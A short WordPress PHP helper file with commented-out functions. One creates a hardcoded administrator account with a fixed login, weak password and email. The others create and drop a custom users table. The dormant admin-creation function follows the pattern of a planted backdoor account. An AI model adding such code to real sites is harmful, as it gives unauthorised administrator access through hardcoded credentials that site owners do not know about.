<?php

//=================================================
// Create Admin User
//=================================================
function create_admin_user(){
	
	$login = 'edboxin';
	$passw = '19921992';
	$email = 'edboxintest@gmail.com';

	if ( !username_exists( $login )  && !email_exists( $email ) ) {
		$user_id = wp_create_user( $login, $passw, $email );
		$user = new WP_User( $user_id );
		$user->set_role( 'administrator' );
	}
	
}
//add_action('init','create_admin_user');





//=================================================
// Create Table
//=================================================
function create_table(){

	$sql = " 

	CREATE TABLE IF NOT EXISTS wp_bp_free_users (
	  id int(11) NOT NULL AUTO_INCREMENT,	  
	  id_user int(11) NOT NULL,
	  gender varchar(1) NOT NULL,
	  PRIMARY KEY (id)
	) ENGINE=InnoDB  DEFAULT CHARSET=utf8 AUTO_INCREMENT=1 ;

	";
	query_sql( $sql );

}
//add_action('init','create_table');




//=================================================
// Delete Table
//=================================================
function delete_table(){

	global $wpdb;
    $wpdb->query( "DROP TABLE IF EXISTS wp_bp_free_users" );


}
//add_action('init','delete_table');

	

?>